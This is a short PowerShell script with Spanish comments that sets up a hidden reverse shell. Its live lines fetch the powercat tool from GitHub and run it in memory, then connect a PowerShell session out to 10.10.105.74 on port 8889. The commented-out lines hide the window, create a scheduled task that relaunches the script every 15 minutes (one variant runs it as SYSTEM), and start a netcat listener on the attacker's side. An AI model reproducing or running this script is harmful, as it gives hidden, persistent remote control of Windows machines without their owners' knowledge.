# Inicia PowerShell Oculto
#start-process PowerShell.exe -arg D:\CODIGOS\PowerShell\initPowercat.ps1 

# Instalar PowerCat en PowerShell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Conectar desde Windows vía PowerShell
powercat -c 10.10.105.74 -p 8889 -ep

# Reconfigura tiempo de una tarea programada
##$Task = Get-ScheduledTask -TaskName "PowerShell Task"
##$Task.Triggers.Repetition.Interval = "PT10M"
##$Task | Set-ScheduledTask -User "NT AUTHORITY\SYSTEM"

# Crea tarea programada
##$Action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File D:\CODIGOS\PowerShell\initPowercat.ps1 -WindowStyle Hidden'
##$Trigger =  New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval '00:15:00.0' -RepetitionDuration '1.00:00:10'
##Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "PowerShell Task" -Description "Tarea programada generada por la consola."

# Poner a la escucha desde Windows
# powercat -l -p 8889 -ep
# Poner a la escucha desde el Atacante
# Linux poner netcat a la escucha
# nc -n -v -l -p 8889

# COMANDO ESPECIAL
# Inicia powershell sin mostrar ningúna ventana IMPORTANTE
## start-process PowerShell.exe -arg D:\CODIGOS\PowerShell\initPowercat.ps1 -WindowStyle Hidden

## CREAR TAREA PROGRAMADA OK
####$Action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File D:\CODIGOS\PowerShell\initPowercat.ps1 -WindowStyle Hidden'
####$TempTrigger = New-ScheduledTaskTrigger -Once -at '00:00' -RepetitionInterval '00:15:00.0' -RepetitionDuration '1.00:00:10'
####$Trigger = New-ScheduledTaskTrigger -Daily -At "09:00" 
####$Trigger.Repetition = $TempTrigger.Repetition
####Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "PowerShell Task" -Description "Tarea programada generada por la consola."